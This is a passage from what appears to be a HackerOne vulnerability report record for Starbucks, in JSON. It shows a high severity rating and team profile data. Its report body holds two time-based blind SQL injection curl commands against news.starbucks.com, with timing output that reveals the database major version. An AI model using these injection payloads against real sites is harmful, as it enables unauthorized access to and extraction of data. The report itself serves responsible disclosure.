version being 5:</p>\n<pre class=\"highlight plaintext\"><code>time curl --data &quot;ACT=55&amp;jsontree={&quot;x&quot;:1}&amp;site_id=1&amp;group_id=1&#39;-IF(MID(VERSION(),1,1)=&#39;5&#39;,SLEEP(1),0) AND group_id=&#39;1&quot; https://news.starbucks.com\n\nreal    0m4.945s\n\ntime curl --data &quot;ACT=55&amp;jsontree={&quot;x&quot;:1}&amp;site_id=1&amp;group_id=1&#39;-IF(MID(VERSION(),1,1)=&#39;4&#39;,SLEEP(1),0) AND group_id=&#39;1&quot; https://news.starbucks.com\n\nreal    0m1.005s\n</code></pre>", 
    "severity_rating": "high", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "http://www.starbucks.com", 
            "about": "Inspiring and nurturing the human spirit -- one person, one cup, one neighborhood at a time.", 
            "twitter_handle": "Starbucks", 
            "name": "Starbucks"
        }, 
        "handle": "starbucks", 
        "url": "https://hackerone.com/starbucks", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/989/eeb88a587d959eb797ceed8669b245ec9ef20b81_small.?1432930626", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/001/989/48053f0ef688949bbb28248c5fc6ebb4f389820d_medium.?1432930626"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 1989, 
        "default_currency": "usd"
    }, 
    "is_published": false
}